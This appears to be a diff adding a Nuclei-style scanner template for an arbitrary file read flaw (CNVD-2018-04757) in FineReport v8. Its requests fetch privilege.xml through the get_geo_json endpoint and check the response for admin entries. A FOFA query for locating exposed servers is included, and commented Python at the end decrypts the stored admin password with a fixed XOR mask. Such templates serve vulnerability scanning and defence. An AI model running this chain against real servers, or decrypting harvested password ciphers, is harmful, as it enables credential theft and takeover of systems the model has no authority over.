@@ -1,0 +1,43 @@
+id: fanruan-finereport-v8-getgeojson-fileread
+
+info:
+  name: 帆软报表 V8 get_geo_json - 任意文件读取漏洞 CNVD-2018-04757
+  author: leadlife
+  severity: high
+  description: FineReport报表软件是一款纯Java编写的，集数据展示(报表)和数据录入(表单)功能于一身的企业级web报表工具。FineReport v8.0版本存在任意文件读取漏洞，攻击者可利用漏洞读取网站任意文件
+  reference: 
+    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20V9%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
+  metadata:
+    verified: true
+    fofa-query: app="帆软-FineReport"
+  tags: fanruan,finereport,fileread,2018
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
+      - "{{BaseURL}}/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
+
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - '![CDATA[admin]'
+
+# 解密 py script
+# cipher = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' #密文
+# PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] #掩码
+# Password = ""
+# cipher = cipher[3:] #截断三位后
+# for i in range(int(len(cipher) / 4)):
+#     c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
+#     c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
+#     Password = Password + chr(c2)
+# print (Password)
